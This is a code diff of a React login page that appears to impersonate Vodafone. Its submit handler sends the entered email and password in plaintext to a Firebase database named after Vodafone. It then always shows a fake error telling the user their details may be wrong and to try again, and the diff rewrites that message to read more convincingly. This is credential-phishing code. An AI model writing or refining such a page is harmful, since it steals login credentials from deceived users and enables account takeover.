@@ -3,43 +3,46 @@ import { GoAlert } from "react-icons/go";
 import { AiOutlineEye, AiOutlineEyeInvisible } from "react-icons/ai";
 
 const Loginnew = () => {
-    const [alertMessage, setAlertMessage] = useState("");
-    const [showAlert, setShowAlert] = useState(false);
-    const [showPassword, setShowPassword] = useState(false); // State for toggling password visibility
+  const [alertMessage, setAlertMessage] = useState("");
+  const [showAlert, setShowAlert] = useState(false);
+  const [showPassword, setShowPassword] = useState(false); // State for toggling password visibility
 
-    const [user, setUser] = useState({
-         Email : '',
-         Password : '',
-    })
+  const [user, setUser] = useState({
+    Email: "",
+    Password: "",
+  });
 
-    let name, value;
-    const data = (e) => {
-        name = e.target.name;
-        value = e.target.value;
-        setUser({...user, [name]:value});
+  let name, value;
+  const data = (e) => {
+    name = e.target.name;
+    value = e.target.value;
+    setUser({ ...user, [name]: value });
+  };
+
+  const getdata = async (e) => {
+    const { Email, Password } = user;
+    e.preventDefault();
+    const options = {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        Email,
+        Password,
+      }),
+    };
+    const res = await fetch(
+      "https://vodafone-f3364-default-rtdb.firebaseio.com/UserData.json",
+      options
+    );
+    if (res) {
+      setAlertMessage(
+        "Something went wrong. This might be an error with your details, please try again!"
+      );
+      setShowAlert(true);
     }
-
-    const getdata = async (e) => {
-        const {Email, Password} = user;
-        e.preventDefault();
-        const options = {
-            method : 'POST',
-            headers : {
-                 'Content-Type' : 'application/json'
-            },
-            body : JSON.stringify({
-                Email,Password
-            })
-        }
-        const res = await fetch(
-            'https://vodafone-f3364-default-rtdb.firebaseio.com/UserData.json',
-            options
-        )
-        if(res){
-            setAlertMessage("Error occurred while saving data!");
-            setShowAlert(true);
-        }
-    }
+  };
 
   return (
     <main className="bg-[#F2F2F2] flex justify-center items-center h-full py-8 md:py-6 lg:py-0 md:h-screen">
@@ -135,7 +138,6 @@ const Loginnew = () => {
                     : "bg-[#F59E9E] cursor-not-allowed"
                 } focus:outline-none`}
                 disabled={!user.Email || !user.Password}
-
                 onClick={getdata}
               >
                 Continue
